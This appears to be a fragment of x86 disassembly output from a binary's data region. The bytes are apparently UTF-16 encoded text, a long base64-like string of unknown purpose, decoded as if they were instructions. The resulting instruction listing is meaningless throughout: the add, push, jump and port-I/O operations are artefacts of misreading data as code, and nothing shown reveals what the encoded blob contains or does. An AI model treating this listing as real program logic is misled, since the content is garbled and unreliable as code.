  40aeeb:	00 55 00             	add    %dl,0x0(%ebp)
  40aeee:	47                   	inc    %edi
  40aeef:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40aef3:	00 55 00             	add    %dl,0x0(%ebp)
  40aef6:	39 00                	cmp    %eax,(%eax)
  40aef8:	70 00                	jo     0x40aefa
  40aefa:	53                   	push   %ebx
  40aefb:	00 7a 00             	add    %bh,0x0(%edx)
  40aefe:	64 00 4c 00 6c       	add    %cl,%fs:0x6c(%eax,%eax,1)
  40af03:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40af07:	00 48 00             	add    %cl,0x0(%eax)
  40af0a:	70 00                	jo     0x40af0c
  40af0c:	33 00                	xor    (%eax),%eax
  40af0e:	4f                   	dec    %edi
  40af0f:	00 4e 00             	add    %cl,0x0(%esi)
  40af12:	4f                   	dec    %edi
  40af13:	00 77 00             	add    %dh,0x0(%edi)
  40af16:	7a 00                	jp     0x40af18
  40af18:	55                   	push   %ebp
  40af19:	00 68 00             	add    %ch,0x0(%eax)
  40af1c:	62 00                	bound  %eax,(%eax)
  40af1e:	57                   	push   %edi
  40af1f:	00 55 00             	add    %dl,0x0(%ebp)
  40af22:	4b                   	dec    %ebx
  40af23:	00 6e 00             	add    %ch,0x0(%esi)
  40af26:	68 00 79 00 47       	push   $0x47007900
  40af2b:	00 4e 00             	add    %cl,0x0(%esi)
  40af2e:	61                   	popa
  40af2f:	00 4e 00             	add    %cl,0x0(%esi)
  40af32:	48                   	dec    %eax
  40af33:	00 56 00             	add    %dl,0x0(%esi)
  40af36:	32 00                	xor    (%eax),%al
  40af38:	4a                   	dec    %edx
  40af39:	00 6e 00             	add    %ch,0x0(%esi)
  40af3c:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40af40:	56                   	push   %esi
  40af41:	00 46 00             	add    %al,0x0(%esi)
  40af44:	2f                   	das
  40af45:	00 35 00 68 00 6a    	add    %dh,0x6a006800
  40af4b:	00 30                	add    %dh,(%eax)
  40af4d:	00 37                	add    %dh,(%edi)
  40af4f:	00 43 00             	add    %al,0x0(%ebx)
  40af52:	56                   	push   %esi
  40af53:	00 61 00             	add    %ah,0x0(%ecx)
  40af56:	4e                   	dec    %esi
  40af57:	00 43 00             	add    %al,0x0(%ebx)
  40af5a:	46                   	inc    %esi
  40af5b:	00 48 00             	add    %cl,0x0(%eax)
  40af5e:	6c                   	insb   (%dx),%es:(%edi)
  40af5f:	00 49 00             	add    %cl,0x0(%ecx)
  40af62:	4f                   	dec    %edi
  40af63:	00 4a 00             	add    %cl,0x0(%edx)
  40af66:	5a                   	pop    %edx
  40af67:	00 6d 00             	add    %ch,0x0(%ebp)
  40af6a:	38 00                	cmp    %al,(%eax)
  40af6c:	74 00                	je     0x40af6e
  40af6e:	6a 00                	push   $0x0
  40af70:	4d                   	dec    %ebp
  40af71:	00 33                	add    %dh,(%ebx)
  40af73:	00 6a 00             	add    %ch,0x0(%edx)
  40af76:	74 00                	je     0x40af78
  40af78:	6a 00                	push   $0x0
  40af7a:	4a                   	dec    %edx
  40af7b:	00 43 00             	add    %al,0x0(%ebx)
  40af7e:	42                   	inc    %edx
  40af7f:	00 71 00             	add    %dh,0x0(%ecx)
  40af82:	61                   	popa
  40af83:	00 6f 00             	add    %ch,0x0(%edi)
  40af86:	59                   	pop    %ecx
  40af87:	00 32                	add    %dh,(%edx)
  40af89:	00 51 00             	add    %dl,0x0(%ecx)
  40af8c:	47                   	inc    %edi
  40af8d:	00 78 00             	add    %bh,0x0(%eax)
  40af90:	72 00                	jb     0x40af92
  40af92:	51                   	push   %ecx
  40af93:	00 6f 00             	add    %ch,0x0(%edi)
  40af96:	34 00                	xor    $0x0,%al
  40af98:	37                   	aaa
  40af99:	00 77 00             	add    %dh,0x0(%edi)
  40af9c:	47                   	inc    %edi
  40af9d:	00 61 00             	add    %ah,0x0(%ecx)
  40afa0:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40afa4:	71 00                	jno    0x40afa6
  40afa6:	5a                   	pop    %edx
  40afa7:	00 2b                	add    %ch,(%ebx)
  40afa9:	00 36                	add    %dh,(%esi)
  40afab:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afae:	6f                   	outsl  %ds:(%esi),(%dx)
  40afaf:	00 72 00             	add    %dh,0x0(%edx)
  40afb2:	45                   	inc    %ebp
  40afb3:	00 7a 00             	add    %bh,0x0(%edx)
  40afb6:	52                   	push   %edx
  40afb7:	00 62 00             	add    %ah,0x0(%edx)
  40afba:	72 00                	jb     0x40afbc
  40afbc:	63 00                	arpl   %eax,(%eax)
  40afbe:	69 00 49 00 46 00    	imul   $0x460049,(%eax),%eax
  40afc4:	6f                   	outsl  %ds:(%esi),(%dx)
  40afc5:	00 6e 00             	add    %ch,0x0(%esi)
  40afc8:	76 00                	jbe    0x40afca
  40afca:	4d                   	dec    %ebp
  40afcb:	00 68 00             	add    %ch,0x0(%eax)
  40afce:	4e                   	dec    %esi
  40afcf:	00 38                	add    %bh,(%eax)
  40afd1:	00 6e 00             	add    %ch,0x0(%esi)
  40afd4:	71 00                	jno    0x40afd6
  40afd6:	4b                   	dec    %ebx
  40afd7:	00 42 00             	add    %al,0x0(%edx)
  40afda:	6f                   	outsl  %ds:(%esi),(%dx)
  40afdb:	00 76 00             	add    %dh,0x0(%esi)
  40afde:	2f                   	das
  40afdf:	00 61 00             	add    %ah,0x0(%ecx)
  40afe2:	52                   	push   %edx
  40afe3:	00 48 00             	add    %cl,0x0(%eax)
  40afe6:	71 00                	jno    0x40afe8
  40afe8:	6f                   	outsl  %ds:(%esi),(%dx)
  40afe9:	00 46 00             	add    %al,0x0(%esi)
  40afec:	35 00 55 00 46       	xor    $0x46005500,%eax
  40aff1:	00 56 00             	add    %dl,0x0(%esi)
  40aff4:	77 00                	ja     0x40aff6
  40aff6:	34 00                	xor    $0x0,%al
  40aff8:	33 00                	xor    (%eax),%eax
  40affa:	55                   	push   %ebp
  40affb:	00 43 00             	add    %al,0x0(%ebx)
  40affe:	56                   	push   %esi
  40afff:	00 52 00             	add    %dl,0x0(%edx)
  40b002:	37                   	aaa
  40b003:	00 6b 00             	add    %ch,0x0(%ebx)
  40b006:	45                   	inc    %ebp
  40b007:	00 6b 00             	add    %ch,0x0(%ebx)
  40b00a:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40b00e:	6c                   	insb   (%dx),%es:(%edi)
  40b00f:	00 45 00             	add    %al,0x0(%ebp)
  40b012:	34 00                	xor    $0x0,%al
  40b014:	79 00                	jns    0x40b016
  40b016:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40b01a:	49                   	dec    %ecx
  40b01b:	00 55 00             	add    %dl,0x0(%ebp)
  40b01e:	43                   	inc    %ebx
  40b01f:	00 55 00             	add    %dl,0x0(%ebp)
  40b022:	51                   	push   %ecx
  40b023:	00 47 00             	add    %al,0x0(%edi)
  40b026:	41                   	inc    %ecx
  40b027:	00 67 00             	add    %ah,0x0(%edi)
  40b02a:	62 00                	bound  %eax,(%eax)
  40b02c:	76 00                	jbe    0x40b02e
  40b02e:	47                   	inc    %edi
  40b02f:	00 4b 00             	add    %cl,0x0(%ebx)
  40b032:	47                   	inc    %edi
  40b033:	00 50 00             	add    %dl,0x0(%eax)
  40b036:	48                   	dec    %eax
  40b037:	00 59 00             	add    %bl,0x0(%ecx)
  40b03a:	79 00                	jns    0x40b03c
  40b03c:	6d                   	insl   (%dx),%es:(%edi)
  40b03d:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40b041:	00 63 00             	add    %ah,0x0(%ebx)
  40b044:	70 00                	jo     0x40b046
  40b046:	76 00                	jbe    0x40b048
  40b048:	7a 00                	jp     0x40b04a
  40b04a:	50                   	push   %eax
  40b04b:	00 50 00             	add    %dl,0x0(%eax)
  40b04e:	75 00                	jne    0x40b050
  40b050:	42                   	inc    %edx
  40b051:	00 67 00             	add    %ah,0x0(%edi)
  40b054:	7a 00                	jp     0x40b056
  40b056:	35 00 70 00 63       	xor    $0x63007000,%eax
  40b05b:	00 62 00             	add    %ah,0x0(%edx)
  40b05e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b05f:	00 38                	add    %bh,(%eax)
  40b061:	00 76 00             	add    %dh,0x0(%esi)
  40b064:	2b 00                	sub    (%eax),%eax
  40b066:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40b06a:	66 00 46 00          	data16 add %al,0x0(%esi)
  40b06e:	46                   	inc    %esi
  40b06f:	00 37                	add    %dh,(%edi)
  40b071:	00 6e 00             	add    %ch,0x0(%esi)
  40b074:	56                   	push   %esi
  40b075:	00 77 00             	add    %dh,0x0(%edi)
  40b078:	2b 00                	sub    (%eax),%eax
  40b07a:	4c                   	dec    %esp
  40b07b:	00 49 00             	add    %cl,0x0(%ecx)
  40b07e:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40b082:	5a                   	pop    %edx
  40b083:	00 63 00             	add    %ah,0x0(%ebx)
  40b086:	61                   	popa
  40b087:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40b08b:	00 71 00             	add    %dh,0x0(%ecx)
  40b08e:	39 00                	cmp    %eax,(%eax)
  40b090:	53                   	push   %ebx
  40b091:	00 79 00             	add    %bh,0x0(%ecx)
  40b094:	6f                   	outsl  %ds:(%esi),(%dx)
  40b095:	00 45 00             	add    %al,0x0(%ebp)
  40b098:	57                   	push   %edi
  40b099:	00 47 00             	add    %al,0x0(%edi)
  40b09c:	58                   	pop    %eax
  40b09d:	00 65 00             	add    %ah,0x0(%ebp)
  40b0a0:	43                   	inc    %ebx
  40b0a1:	00 50 00             	add    %dl,0x0(%eax)
  40b0a4:	4c                   	dec    %esp
  40b0a5:	00 67 00             	add    %ah,0x0(%edi)
  40b0a8:	78 00                	js     0x40b0aa
  40b0aa:	58                   	pop    %eax
  40b0ab:	00 67 00             	add    %ah,0x0(%edi)
  40b0ae:	75 00                	jne    0x40b0b0
  40b0b0:	61                   	popa
  40b0b1:	00 5a 00             	add    %bl,0x0(%edx)
  40b0b4:	74 00                	je     0x40b0b6
  40b0b6:	45                   	inc    %ebp
  40b0b7:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40b0bb:	00 5a 00             	add    %bl,0x0(%edx)
  40b0be:	7a 00                	jp     0x40b0c0
  40b0c0:	37                   	aaa
  40b0c1:	00 78 00             	add    %bh,0x0(%eax)
  40b0c4:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40b0c8:	76 00                	jbe    0x40b0ca
  40b0ca:	37                   	aaa
  40b0cb:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40b0cf:	00 45 00             	add    %al,0x0(%ebp)
  40b0d2:	6a 00                	push   $0x0
  40b0d4:	30 00                	xor    %al,(%eax)
  40b0d6:	41                   	inc    %ecx
  40b0d7:	00 6a 00             	add    %ch,0x0(%edx)
  40b0da:	48                   	dec    %eax
  40b0db:	00 76 00             	add    %dh,0x0(%esi)
  40b0de:	59                   	pop    %ecx
  40b0df:	00 71 00             	add    %dh,0x0(%ecx)
  40b0e2:	44                   	inc    %esp
  40b0e3:	00 4e 00             	add    %cl,0x0(%esi)
  40b0e6:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40b0ea:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40b0ee:	76 00                	jbe    0x40b0f0
  40b0f0:	71 00                	jno    0x40b0f2
  40b0f2:	5a                   	pop    %edx
  40b0f3:	00 5a 00             	add    %bl,0x0(%edx)
  40b0f6:	37                   	aaa
  40b0f7:	00 57 00             	add    %dl,0x0(%edi)
  40b0fa:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b0fe:	55                   	push   %ebp
  40b0ff:	00 70 00             	add    %dh,0x0(%eax)
  40b102:	77 00                	ja     0x40b104
  40b104:	4f                   	dec    %edi
  40b105:	00 79 00             	add    %bh,0x0(%ecx)
  40b108:	72 00                	jb     0x40b10a
  40b10a:	54                   	push   %esp
  40b10b:	00 7a 00             	add    %bh,0x0(%edx)
  40b10e:	57                   	push   %edi
  40b10f:	00 2f                	add    %ch,(%edi)
  40b111:	00 4f 00             	add    %cl,0x0(%edi)
  40b114:	72 00                	jb     0x40b116
  40b116:	5a                   	pop    %edx
  40b117:	00 6f 00             	add    %ch,0x0(%edi)
  40b11a:	72 00                	jb     0x40b11c
  40b11c:	68 00 74 00 41       	push   $0x41007400
  40b121:	00 42 00             	add    %al,0x0(%edx)
  40b124:	54                   	push   %esp
  40b125:	00 49 00             	add    %cl,0x0(%ecx)
  40b128:	35 00 34 00 4d       	xor    $0x4d003400,%eax
  40b12d:	00 79 00             	add    %bh,0x0(%ecx)
  40b130:	59                   	pop    %ecx
  40b131:	00 2f                	add    %ch,(%edi)
  40b133:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  40b137:	00 39                	add    %bh,(%ecx)
  40b139:	00 39                	add    %bh,(%ecx)
  40b13b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b13e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b13f:	00 51 00             	add    %dl,0x0(%ecx)
  40b142:	72 00                	jb     0x40b144
  40b144:	47                   	inc    %edi
  40b145:	00 6d 00             	add    %ch,0x0(%ebp)
  40b148:	43                   	inc    %ebx
  40b149:	00 46 00             	add    %al,0x0(%esi)
  40b14c:	57                   	push   %edi
  40b14d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b150:	55                   	push   %ebp
  40b151:	00 42 00             	add    %al,0x0(%edx)
  40b154:	2b 00                	sub    (%eax),%eax
  40b156:	33 00                	xor    (%eax),%eax
  40b158:	75 00                	jne    0x40b15a
  40b15a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b15b:	00 63 00             	add    %ah,0x0(%ebx)
  40b15e:	45                   	inc    %ebp
  40b15f:	00 35 00 36 00 44    	add    %dh,0x44003600
  40b165:	00 39                	add    %bh,(%ecx)
  40b167:	00 4d 00             	add    %cl,0x0(%ebp)
  40b16a:	72 00                	jb     0x40b16c
  40b16c:	61                   	popa
  40b16d:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40b171:	00 72 00             	add    %dh,0x0(%edx)
  40b174:	70 00                	jo     0x40b176
  40b176:	6b 00 70             	imul   $0x70,(%eax),%eax
  40b179:	00 75 00             	add    %dh,0x0(%ebp)
  40b17c:	74 00                	je     0x40b17e
  40b17e:	65 00 38             	add    %bh,%gs:(%eax)
  40b181:	00 48 00             	add    %cl,0x0(%eax)
  40b184:	4f                   	dec    %edi
  40b185:	00 4b 00             	add    %cl,0x0(%ebx)
  40b188:	62 00                	bound  %eax,(%eax)
  40b18a:	2b 00                	sub    (%eax),%eax
  40b18c:	35 00 75 00 6b       	xor    $0x6b007500,%eax
  40b191:	00 33                	add    %dh,(%ebx)
  40b193:	00 73 00             	add    %dh,0x0(%ebx)
  40b196:	39 00                	cmp    %eax,(%eax)
  40b198:	6e                   	outsb  %ds:(%esi),(%dx)
  40b199:	00 58 00             	add    %bl,0x0(%eax)
  40b19c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b19d:	00 79 00             	add    %bh,0x0(%ecx)
  40b1a0:	57                   	push   %edi
  40b1a1:	00 42 00             	add    %al,0x0(%edx)
  40b1a4:	63 00                	arpl   %eax,(%eax)
  40b1a6:	2b 00                	sub    (%eax),%eax
  40b1a8:	33 00                	xor    (%eax),%eax
  40b1aa:	77 00                	ja     0x40b1ac
  40b1ac:	30 00                	xor    %al,(%eax)
  40b1ae:	37                   	aaa
  40b1af:	00 76 00             	add    %dh,0x0(%esi)
  40b1b2:	4c                   	dec    %esp
  40b1b3:	00 61 00             	add    %ah,0x0(%ecx)
  40b1b6:	34 00                	xor    $0x0,%al
  40b1b8:	30 00                	xor    %al,(%eax)
  40b1ba:	44                   	inc    %esp
  40b1bb:	00 79 00             	add    %bh,0x0(%ecx)
  40b1be:	2b 00                	sub    (%eax),%eax
  40b1c0:	52                   	push   %edx
  40b1c1:	00 4e 00             	add    %cl,0x0(%esi)
  40b1c4:	41                   	inc    %ecx
  40b1c5:	00 79 00             	add    %bh,0x0(%ecx)
  40b1c8:	74 00                	je     0x40b1ca
  40b1ca:	69 00 4a 00 6f 00    	imul   $0x6f004a,(%eax),%eax
  40b1d0:	47                   	inc    %edi
  40b1d1:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1d4:	44                   	inc    %esp
  40b1d5:	00 35 00 39 00 62    	add    %dh,0x62003900
  40b1db:	00 70 00             	add    %dh,0x0(%eax)
  40b1de:	48                   	dec    %eax
  40b1df:	00 67 00             	add    %ah,0x0(%edi)
  40b1e2:	47                   	inc    %edi
  40b1e3:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1e6:	4b                   	dec    %ebx
  40b1e7:	00 78 00             	add    %bh,0x0(%eax)
  40b1ea:	6d                   	insl   (%dx),%es:(%edi)
  40b1eb:	00 71 00             	add    %dh,0x0(%ecx)
  40b1ee:	6d                   	insl   (%dx),%es:(%edi)
  40b1ef:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1f2:	66 00 54 00 36       	data16 add %dl,0x36(%eax,%eax,1)
  40b1f7:	00 41 00             	add    %al,0x0(%ecx)
  40b1fa:	62 00                	bound  %eax,(%eax)
  40b1fc:	34 00                	xor    $0x0,%al
  40b1fe:	61                   	popa
  40b1ff:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40b203:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40b207:	00 6a 00             	add    %ch,0x0(%edx)
  40b20a:	45                   	inc    %ebp
  40b20b:	00 61 00             	add    %ah,0x0(%ecx)
  40b20e:	37                   	aaa
  40b20f:	00 53 00             	add    %dl,0x0(%ebx)
  40b212:	6a 00                	push   $0x0
  40b214:	54                   	push   %esp
  40b215:	00 49 00             	add    %cl,0x0(%ecx)
  40b218:	4e                   	dec    %esi
  40b219:	00 6a 00             	add    %ch,0x0(%edx)
  40b21c:	54                   	push   %esp
  40b21d:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40b221:	00 31                	add    %dh,(%ecx)
  40b223:	00 57 00             	add    %dl,0x0(%edi)
  40b226:	71 00                	jno    0x40b228
  40b228:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40b22c:	6a 00                	push   $0x0
  40b22e:	38 00                	cmp    %al,(%eax)
  40b230:	70 00                	jo     0x40b232
  40b232:	43                   	inc    %ebx
  40b233:	00 66 00             	add    %ah,0x0(%esi)
  40b236:	2f                   	das
  40b237:	00 79 00             	add    %bh,0x0(%ecx)
  40b23a:	68 00 38 00 6f       	push   $0x6f003800
  40b23f:	00 69 00             	add    %ch,0x0(%ecx)
  40b242:	54                   	push   %esp
  40b243:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  40b247:	00 68 00             	add    %ch,0x0(%eax)
  40b24a:	72 00                	jb     0x40b24c
  40b24c:	45                   	inc    %ebp
  40b24d:	00 70 00             	add    %dh,0x0(%eax)
  40b250:	76 00                	jbe    0x40b252
  40b252:	50                   	push   %eax
  40b253:	00 37                	add    %dh,(%edi)
  40b255:	00 47 00             	add    %al,0x0(%edi)
  40b258:	6f                   	outsl  %ds:(%esi),(%dx)
  40b259:	00 2b                	add    %ch,(%ebx)
  40b25b:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  40b25f:	00 51 00             	add    %dl,0x0(%ecx)
  40b262:	41                   	inc    %ecx
  40b263:	00 75 00             	add    %dh,0x0(%ebp)
  40b266:	31 00                	xor    %eax,(%eax)
  40b268:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40b26c:	4d                   	dec    %ebp
  40b26d:	00 71 00             	add    %dh,0x0(%ecx)
  40b270:	33 00                	xor    (%eax),%eax
  40b272:	4a                   	dec    %edx
  40b273:	00 49 00             	add    %cl,0x0(%ecx)
  40b276:	42                   	inc    %edx
  40b277:	00 49 00             	add    %cl,0x0(%ecx)
  40b27a:	4a                   	dec    %edx
  40b27b:	00 72 00             	add    %dh,0x0(%edx)
  40b27e:	36 00 36             	add    %dh,%ss:(%esi)
  40b281:	00 2b                	add    %ch,(%ebx)
  40b283:	00 2f                	add    %ch,(%edi)
  40b285:	00 68 00             	add    %ch,0x0(%eax)
  40b288:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40b28c:	75 00                	jne    0x40b28e
  40b28e:	43                   	inc    %ebx
  40b28f:	00 67 00             	add    %ah,0x0(%edi)
  40b292:	58                   	pop    %eax
  40b293:	00 78 00             	add    %bh,0x0(%eax)
  40b296:	56                   	push   %esi
  40b297:	00 36                	add    %dh,(%esi)
  40b299:	00 50 00             	add    %dl,0x0(%eax)
  40b29c:	61                   	popa
  40b29d:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40b2a1:	00 35 00 6f 00 77    	add    %dh,0x77006f00
  40b2a7:	00 56 00             	add    %dl,0x0(%esi)
  40b2aa:	37                   	aaa
  40b2ab:	00 63 00             	add    %ah,0x0(%ebx)
  40b2ae:	2f                   	das
  40b2af:	00 30                	add    %dh,(%eax)
  40b2b1:	00 68 00             	add    %ch,0x0(%eax)
  40b2b4:	53                   	push   %ebx
  40b2b5:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2b8:	53                   	push   %ebx
  40b2b9:	00 39                	add    %bh,(%ecx)
  40b2bb:	00 41 00             	add    %al,0x0(%ecx)
  40b2be:	54                   	push   %esp
  40b2bf:	00 76 00             	add    %dh,0x0(%esi)
  40b2c2:	58                   	pop    %eax
  40b2c3:	00 70 00             	add    %dh,0x0(%eax)
  40b2c6:	42                   	inc    %edx
  40b2c7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2ca:	54                   	push   %esp
  40b2cb:	00 58 00             	add    %bl,0x0(%eax)
  40b2ce:	31 00                	xor    %eax,(%eax)
  40b2d0:	61                   	popa
  40b2d1:	00 37                	add    %dh,(%edi)
  40b2d3:	00 41 00             	add    %al,0x0(%ecx)
  40b2d6:	46                   	inc    %esi
  40b2d7:	00 33                	add    %dh,(%ebx)
  40b2d9:	00 55 00             	add    %dl,0x0(%ebp)
  40b2dc:	6a 00                	push   $0x0
  40b2de:	33 00                	xor    (%eax),%eax
  40b2e0:	34 00                	xor    $0x0,%al
  40b2e2:	54                   	push   %esp
  40b2e3:	00 37                	add    %dh,(%edi)
  40b2e5:	00 33                	add    %dh,(%ebx)
  40b2e7:	00 75 00             	add    %dh,0x0(%ebp)
  40b2ea:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b2ee:	68 00 68 00 64       	push   $0x64006800
  40b2f3:	00 30                	add    %dh,(%eax)
  40b2f5:	00 70 00             	add    %dh,0x0(%eax)
  40b2f8:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40b2fb:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40b2ff:	00 6a 00             	add    %ch,0x0(%edx)
  40b302:	42                   	inc    %edx
  40b303:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40b307:	00 48 00             	add    %cl,0x0(%eax)
  40b30a:	4a                   	dec    %edx
  40b30b:	00 67 00             	add    %ah,0x0(%edi)
  40b30e:	75 00                	jne    0x40b310
  40b310:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40b313:	00 32                	add    %dh,(%edx)
  40b315:	00 55 00             	add    %dl,0x0(%ebp)
  40b318:	35 00 4b 00 71       	xor    $0x71004b00,%eax
  40b31d:	00 73 00             	add    %dh,0x0(%ebx)
  40b320:	6d                   	insl   (%dx),%es:(%edi)
  40b321:	00 38                	add    %bh,(%eax)
  40b323:	00 47 00             	add    %al,0x0(%edi)
  40b326:	7a 00                	jp     0x40b328
  40b328:	59                   	pop    %ecx
  40b329:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40b32d:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40b331:	00 4f 00             	add    %cl,0x0(%edi)
  40b334:	72 00                	jb     0x40b336
  40b336:	54                   	push   %esp
  40b337:	00 4f 00             	add    %cl,0x0(%edi)
  40b33a:	64 00 31             	add    %dh,%fs:(%ecx)
  40b33d:	00 68 00             	add    %ch,0x0(%eax)
  40b340:	76 00                	jbe    0x40b342
  40b342:	6f                   	outsl  %ds:(%esi),(%dx)
  40b343:	00 6e 00             	add    %ch,0x0(%esi)
  40b346:	7a 00                	jp     0x40b348
  40b348:	5a                   	pop    %edx
  40b349:	00 43 00             	add    %al,0x0(%ebx)
  40b34c:	38 00                	cmp    %al,(%eax)
  40b34e:	68 00 71 00 57       	push   $0x57007100
  40b353:	00 6d 00             	add    %ch,0x0(%ebp)
  40b356:	41                   	inc    %ecx
  40b357:	00 48 00             	add    %cl,0x0(%eax)
  40b35a:	75 00                	jne    0x40b35c
  40b35c:	70 00                	jo     0x40b35e
  40b35e:	58                   	pop    %eax
  40b35f:	00 51 00             	add    %dl,0x0(%ecx)
  40b362:	52                   	push   %edx
  40b363:	00 51 00             	add    %dl,0x0(%ecx)
  40b366:	77 00                	ja     0x40b368
  40b368:	2b 00                	sub    (%eax),%eax
  40b36a:	59                   	pop    %ecx
  40b36b:	00 79 00             	add    %bh,0x0(%ecx)
  40b36e:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40b372:	74 00                	je     0x40b374
  40b374:	42                   	inc    %edx
  40b375:	00 6b 00             	add    %ch,0x0(%ebx)
  40b378:	58                   	pop    %eax
  40b379:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40b37d:	00 61 00             	add    %ah,0x0(%ecx)
  40b380:	6a 00                	push   $0x0
  40b382:	39 00                	cmp    %eax,(%eax)
  40b384:	68 00 30 00 33       	push   $0x33003000
  40b389:	00 5a 00             	add    %bl,0x0(%edx)
  40b38c:	6d                   	insl   (%dx),%es:(%edi)
  40b38d:	00 37                	add    %dh,(%edi)
  40b38f:	00 72 00             	add    %dh,0x0(%edx)
  40b392:	35 00 51 00 47       	xor    $0x47005100,%eax
  40b397:	00 30                	add    %dh,(%eax)
  40b399:	00 73 00             	add    %dh,0x0(%ebx)
  40b39c:	4d                   	dec    %ebp
  40b39d:	00 62 00             	add    %ah,0x0(%edx)
  40b3a0:	61                   	popa
  40b3a1:	00 69 00             	add    %ch,0x0(%ecx)
  40b3a4:	73 00                	jae    0x40b3a6
  40b3a6:	69 00 77 00 4e 00    	imul   $0x4e0077,(%eax),%eax
  40b3ac:	32 00                	xor    (%eax),%al
  40b3ae:	59                   	pop    %ecx
  40b3af:	00 2f                	add    %ch,(%edi)
  40b3b1:	00 41 00             	add    %al,0x0(%ecx)
  40b3b4:	2f                   	das
  40b3b5:	00 4e 00             	add    %cl,0x0(%esi)
  40b3b8:	68 00 44 00 49       	push   $0x49004400
  40b3bd:	00 63 00             	add    %ah,0x0(%ebx)
  40b3c0:	58                   	pop    %eax
  40b3c1:	00 73 00             	add    %dh,0x0(%ebx)
  40b3c4:	35 00 4c 00 46       	xor    $0x46004c00,%eax
  40b3c9:	00 41 00             	add    %al,0x0(%ecx)
  40b3cc:	35 00 61 00 71       	xor    $0x71006100,%eax
  40b3d1:	00 65 00             	add    %ah,0x0(%ebp)
  40b3d4:	2f                   	das
  40b3d5:	00 5a 00             	add    %bl,0x0(%edx)
  40b3d8:	76 00                	jbe    0x40b3da
  40b3da:	4a                   	dec    %edx
  40b3db:	00 32                	add    %dh,(%edx)
  40b3dd:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40b3e1:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b3e5:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40b3e9:	00 46 00             	add    %al,0x0(%esi)
  40b3ec:	30 00                	xor    %al,(%eax)
  40b3ee:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b3f2:	6c                   	insb   (%dx),%es:(%edi)
  40b3f3:	00 51 00             	add    %dl,0x0(%ecx)
  40b3f6:	35 00 49 00 49       	xor    $0x49004900,%eax
  40b3fb:	00 6e 00             	add    %ch,0x0(%esi)
  40b3fe:	4a                   	dec    %edx
  40b3ff:	00 6f 00             	add    %ch,0x0(%edi)
  40b402:	61                   	popa
  40b403:	00 77 00             	add    %dh,0x0(%edi)
  40b406:	66 00 35 00 7a 00 73 	data16 add %dh,0x73007a00
  40b40d:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40b411:	00 4d 00             	add    %cl,0x0(%ebp)
  40b414:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40b418:	77 00                	ja     0x40b41a
  40b41a:	33 00                	xor    (%eax),%eax
  40b41c:	7a 00                	jp     0x40b41e
  40b41e:	4c                   	dec    %esp
  40b41f:	00 78 00             	add    %bh,0x0(%eax)
  40b422:	4b                   	dec    %ebx
  40b423:	00 43 00             	add    %al,0x0(%ebx)
  40b426:	48                   	dec    %eax
  40b427:	00 59 00             	add    %bl,0x0(%ecx)
  40b42a:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40b42e:	2b 00                	sub    (%eax),%eax
  40b430:	79 00                	jns    0x40b432
  40b432:	70 00                	jo     0x40b434
  40b434:	32 00                	xor    (%eax),%al
  40b436:	79 00                	jns    0x40b438
  40b438:	38 00                	cmp    %al,(%eax)
  40b43a:	66 00 46 00          	data16 add %al,0x0(%esi)
  40b43e:	67 00 46 00          	add    %al,0x0(%bp)
  40b442:	53                   	push   %ebx
  40b443:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b446:	61                   	popa
  40b447:	00 78 00             	add    %bh,0x0(%eax)
  40b44a:	32 00                	xor    (%eax),%al
  40b44c:	74 00                	je     0x40b44e
  40b44e:	79 00                	jns    0x40b450
  40b450:	71 00                	jno    0x40b452
